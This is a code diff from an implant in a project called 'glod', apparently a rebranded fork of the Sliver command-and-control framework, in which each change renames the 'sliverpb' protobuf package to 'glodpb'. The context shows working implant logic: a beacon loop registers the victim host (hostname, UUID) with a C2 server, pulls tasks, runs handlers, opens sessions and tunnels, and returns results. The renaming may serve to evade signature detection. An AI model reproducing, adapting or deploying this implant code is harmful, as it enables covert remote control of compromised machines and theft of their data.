@@ -51,7 +51,7 @@ import (
 	"github.com/starkzarn/glod/implant/sliver/pivots"
 	"github.com/starkzarn/glod/implant/sliver/transports"
 	"github.com/starkzarn/glod/implant/sliver/version"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
@@ -300,7 +300,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	register := registerSliver()
 	register.ActiveC2 = beacon.ActiveC2
 	register.ProxyURL = beacon.ProxyURL
-	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+	beacon.Send(wrapEnvelope(glodpb.MsgBeaconRegister, &glodpb.BeaconRegister{
 		ID:          InstanceID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
@@ -366,7 +366,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(glodpb.MsgBeaconTasks, &glodpb.BeaconTasks{
 		ID:          InstanceID,
 		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
@@ -392,7 +392,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{end}}
 		return nil
 	}
-	tasks := &sliverpb.BeaconTasks{}
+	tasks := &glodpb.BeaconTasks{}
 	err = proto.Unmarshal(envelope.Data, tasks)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -408,12 +408,12 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		return nil
 	}
 
-	var tasksExtensionRegister []*sliverpb.Envelope
-	var tasksOther []*sliverpb.Envelope
+	var tasksExtensionRegister []*glodpb.Envelope
+	var tasksOther []*glodpb.Envelope
 
 	for _, task := range tasks.Tasks {
 		switch task.Type {
-		case sliverpb.MsgRegisterExtensionReq:
+		case glodpb.MsgRegisterExtensionReq:
 			tasksExtensionRegister = append(tasksExtensionRegister, task)
 		default:
 			tasksOther = append(tasksOther, task)
@@ -421,7 +421,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	}
 
 	// ensure extensions are registered before they are called
-	var results []*sliverpb.Envelope
+	var results []*glodpb.Envelope
 	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
 		results = append(results, r)
 	}
@@ -429,7 +429,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		results = append(results, r)
 	}
 
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(glodpb.MsgBeaconTasks, &glodpb.BeaconTasks{
 		ID:    InstanceID,
 		Tasks: results,
 	}))
@@ -444,8 +444,8 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	return nil
 }
 
-func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
-	results := []*sliverpb.Envelope{}
+func beaconHandleTasklist(tasks []*glodpb.Envelope) []*glodpb.Envelope {
+	results := []*glodpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
@@ -471,7 +471,7 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 					}
 					log.Printf("[beacon] task completed (id: %d)", taskID)
 					// {{end}}
-					results = append(results, &sliverpb.Envelope{
+					results = append(results, &glodpb.Envelope{
 						ID:   taskID,
 						Data: data,
 					})
@@ -489,17 +489,17 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 					}
 					log.Printf("[beacon] task completed (id: %d)", taskID)
 					// {{end}}
-					results = append(results, &sliverpb.Envelope{
+					results = append(results, &glodpb.Envelope{
 						ID:   taskID,
 						Data: data,
 					})
 				})
 			}()
 			// {{end}}
-		} else if task.Type == sliverpb.MsgOpenSession {
+		} else if task.Type == glodpb.MsgOpenSession {
 			go openSessionHandler(task.Data)
 			resultsMutex.Lock()
-			results = append(results, &sliverpb.Envelope{
+			results = append(results, &glodpb.Envelope{
 				ID:   task.ID,
 				Data: []byte{},
 			})
@@ -509,7 +509,7 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 			handler(task.Data, nil)
 		} else {
 			resultsMutex.Lock()
-			results = append(results, &sliverpb.Envelope{
+			results = append(results, &glodpb.Envelope{
 				ID:                 task.ID,
 				UnknownMessageType: true,
 			})
@@ -529,7 +529,7 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 }
 
 func openSessionHandler(data []byte) {
-	openSession := &sliverpb.OpenSession{}
+	openSession := &glodpb.OpenSession{}
 	err := proto.Unmarshal(data, openSession)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -596,7 +596,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 	register := registerSliver()
 	register.ActiveC2 = connection.URL()
 	register.ProxyURL = connection.ProxyURL()
-	connection.Send <- wrapEnvelope(sliverpb.MsgRegister, register) // Send registration information
+	connection.Send <- wrapEnvelope(glodpb.MsgRegister, register) // Send registration information
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
@@ -640,7 +640,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 					log.Printf("[session] handler function returned an error: %s", err)
 				}
 				// {{end}}
-				connection.Send <- &sliverpb.Envelope{
+				connection.Send <- &glodpb.Envelope{
 					ID:   envelope.ID,
 					Data: data,
 				}
@@ -652,7 +652,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 					log.Printf("[session] handler function returned an error: %s", err)
 				}
 				// {{end}}
-				connection.Send <- &sliverpb.Envelope{
+				connection.Send <- &glodpb.Envelope{
 					ID:   envelope.ID,
 					Data: data,
 				}
@@ -663,13 +663,13 @@ func sessionMainLoop(connection *transports.Connection) error {
 			log.Printf("[recv] tunHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
-		} else if envelope.Type == sliverpb.MsgCloseSession {
+		} else if envelope.Type == glodpb.MsgCloseSession {
 			return nil
 		} else {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
 			// {{end}}
-			connection.Send <- &sliverpb.Envelope{
+			connection.Send <- &glodpb.Envelope{
 				ID:                 envelope.ID,
 				Data:               nil,
 				UnknownMessageType: true,
@@ -680,7 +680,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 }
 
 // Envelope - Creates an envelope with the given type and data.
-func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
+func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *glodpb.Envelope {
 	data, err := proto.Marshal(message)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -688,14 +688,14 @@ func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.E
 		// {{end}}
 		return nil
 	}
-	return &sliverpb.Envelope{
+	return &glodpb.Envelope{
 		Type: msgType,
 		Data: data,
 	}
 }
 
 // registerSliver - Creates a registration protobuf message
-func registerSliver() *sliverpb.Register {
+func registerSliver() *glodpb.Register {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -735,7 +735,7 @@ func registerSliver() *sliverpb.Register {
 	log.Printf("Host Uuid: %s", uuid)
 	// {{end}}
 
-	return &sliverpb.Register{
+	return &glodpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
 		Uuid:              uuid,
